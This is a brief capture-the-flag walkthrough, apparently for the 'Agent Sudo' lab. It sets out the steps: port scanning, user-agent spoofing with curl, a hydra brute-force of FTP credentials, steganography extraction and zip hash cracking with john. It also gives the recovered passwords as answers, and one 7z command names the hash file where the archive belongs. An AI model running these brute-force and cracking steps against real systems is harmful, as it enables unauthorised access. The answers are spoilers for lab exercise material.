# Agent Sudo


- Deploy the machine

	  no answer needed

- How many open ports?

	- `nmap <TARGET_IP>`
	- `3`

- How you redirect yourself to a secret page?

	- `user-agent`

- What is the agent name?

	- Let's try changing the user-agent.
	- `curl -A "A" -L <TARGET_IP>`. Mmmmh...
	- `curl -A "C" -L <TARGET_IP>`. Got it.
	- `chris`

- FTP password

	- `hydra -l chris -P /usr/share/wordlists/rockyou.txt <TARGET_IP> -vV -t 4 ftp`
	- `crystal`

- steg password

	- `ftp <TARGET_IP>`
	- Enter username `chris` and password `crystal`.
	- `mget *`
	- By `ToAgentJ.txt` I can understand there is a pic that isn't a photo actually.
	- In fact, `binwalk -e cutie.png` extracts useful data.
	- `cd _cutie.png.extracted`
	- `zip2john 8702.zip > zip.hash`
	- `john zip.hash` and we get the password
	- `7z e zip.hash`, enter `Y` and the password.
	- `cat ToAgentR.txt`
	- Inserting that weird string into CyberChef (from Base64) we get `Area51`.
	- `Area51`

- Zip file password

	- `alien`